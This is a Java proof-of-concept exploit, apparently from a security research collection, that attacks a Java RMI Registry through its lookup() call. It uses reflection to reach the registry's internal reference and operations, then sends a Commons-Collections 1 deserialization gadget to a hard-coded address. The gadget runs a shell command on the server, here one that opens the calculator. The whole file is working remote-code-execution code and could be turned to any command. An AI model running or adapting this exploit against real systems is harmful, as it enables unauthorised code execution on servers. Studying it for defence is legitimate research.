package registry;


import utils.Serializer;
import sun.rmi.server.UnicastRef;

import java.io.ObjectOutput;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;

/**
 * @author Whoopsunix
 *
 *  lookup() 攻击 Registry
 */
public class Lookup {
    public static void main(String[] args) throws Exception {
        Object annotationInvocationHandler = Serializer.cc1("open -a Calculator.app");

        // 代理封装
        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[]{Remote.class}, (InvocationHandler) annotationInvocationHandler));

        // 客户端逻辑
        Registry registry_remote = LocateRegistry.getRegistry("192.168.66.143", 1099);

        // lookup 逻辑
        // 获取super.ref
        Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        fields_0[0].setAccessible(true);
        UnicastRef ref = (UnicastRef) fields_0[0].get(registry_remote);

        // 获取operations
        Field[] fields_1 = registry_remote.getClass().getDeclaredFields();
        fields_1[0].setAccessible(true);
        Operation[] operations = (Operation[]) fields_1[0].get(registry_remote);

        // 跟 lookup 方法一样的传值过程
        RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L);
        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(proxyEvalObject);
        ref.invoke(var2);
    }
}
